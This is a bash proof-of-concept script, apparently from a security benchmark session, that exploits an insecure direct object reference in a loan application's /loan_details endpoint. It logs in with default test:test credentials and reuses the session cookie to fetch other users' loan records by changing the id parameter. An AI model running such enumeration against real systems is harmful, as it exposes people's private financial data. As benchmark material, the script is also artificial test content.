#!/bin/bash
# POC: IDOR vulnerability in /loan_details endpoint - demonstrates accessing other users' loan data by manipulating the id parameter
# Target: ./repo
# Created: 2025-11-07T18:27:31.470Z
# Session: benchmark-XBEN-023-24-mhp62996

# IDOR Vulnerability POC - /loan_details Endpoint (v3)
# Demonstrates accessing other users' loan details by manipulating the id parameter

TARGET="http://localhost:80"

echo "============================================"
echo "IDOR Vulnerability POC - /loan_details v3"
echo "============================================"
echo ""

# Step 1: Login with default credentials and extract session cookie
echo "[*] Step 1: Authenticating with default credentials (test:test)..."
LOGIN_RESPONSE=$(curl -s -i -X POST "$TARGET/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=test&password=test" 2>&1)

# Extract session cookie from Set-Cookie header
SESSION=$(echo "$LOGIN_RESPONSE" | grep -i "Set-Cookie: session=" | sed 's/.*session=\([^;]*\).*/\1/' | head -1)

if [ -z "$SESSION" ]; then
    echo "[-] Failed to obtain session cookie"
    echo "Login response: $(echo "$LOGIN_RESPONSE" | head -c 300)"
    exit 1
fi

echo "[+] Session cookie obtained: ${SESSION:0:30}..."

echo ""
echo "[*] Step 2: Accessing /loan_details without id parameter (current user's loan)..."
RESPONSE_NO_ID=$(curl -s -H "Cookie: session=$SESSION" "$TARGET/loan_details")

if echo "$RESPONSE_NO_ID" | grep -qi "principal\|loan\|iframe"; then
    echo "[+] Successfully retrieved loan data"
else
    echo "[-] Could not extract loan data from response"
fi

echo ""
echo "[*] Step 3: Attempting IDOR - Accessing /loan_details?id=1..."
RESPONSE_ID_1=$(curl -s -H "Cookie: session=$SESSION" "$TARGET/loan_details?id=1")

FOUND_ID1=0
if echo "$RESPONSE_ID_1" | grep -qi "principal\|loan\|iframe"; then
    echo "[+] Successfully retrieved loan data with id=1"
    FOUND_ID1=1
    # Show some content to verify data is different
    echo "$RESPONSE_ID_1" | grep -o 'term=[0-9]*' | head -1 | sed 's/^/    /'
else
    echo "[-] Could not retrieve loan data with id=1"
fi

echo ""
echo "[*] Step 4: Attempting IDOR - Accessing /loan_details?id=2..."
RESPONSE_ID_2=$(curl -s -H "Cookie: session=$SESSION" "$TARGET/loan_details?id=2")

FOUND_ID2=0
if echo "$RESPONSE_ID_2" | grep -qi "principal\|loan\|iframe"; then
    echo "[+] Successfully retrieved loan data with id=2"
    FOUND_ID2=1
    # Show some content to verify data is different
    echo "$RESPONSE_ID_2" | grep -o 'term=[0-9]*' | head -1 | sed 's/^/    /'
else
    echo "[-] Could not retrieve loan data with id=2"
fi

echo ""
echo "[*] Step 5: Comparing responses to verify different loan data..."
if [ $FOUND_ID1 -eq 1 ] && [ $FOUND_ID2 -eq 1 ]; then
    # Check if the responses are different
    if ! diff <(echo "$RESPONSE_ID_1") <(echo "$RESPONSE_ID_2") > /dev/null 2>&1; then
        echo "[+] Different loan data returned for different id parameters"
        echo "[+] This confirms IDOR vulnerability - different loans accessible!"
    fi
fi

echo ""
echo "============================================"
if [ $FOUND_ID1 -eq 1 ] || [ $FOUND_ID2 -eq 1 ]; then
    echo "[✓] IDOR VULNERABILITY CONFIRMED"
    echo "The application allows accessing other users' loan details"
    echo "by manipulating the 'id' parameter in the /loan_details endpoint."
    echo "============================================"
    exit 0
else
    echo "[-] Could not confirm IDOR vulnerability"
    echo "============================================"
    exit 1
fi